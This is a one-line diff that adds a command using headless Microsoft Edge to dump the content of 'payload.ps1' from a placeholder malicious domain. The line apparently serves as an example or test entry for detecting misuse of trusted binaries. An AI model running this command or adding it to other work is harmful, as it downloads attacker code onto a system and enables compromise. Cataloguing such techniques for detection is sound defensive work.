@@ -1,0 +1,1 @@
+msedge.exe --headless --dump-dom http://malicious-domain.com/payload.ps1
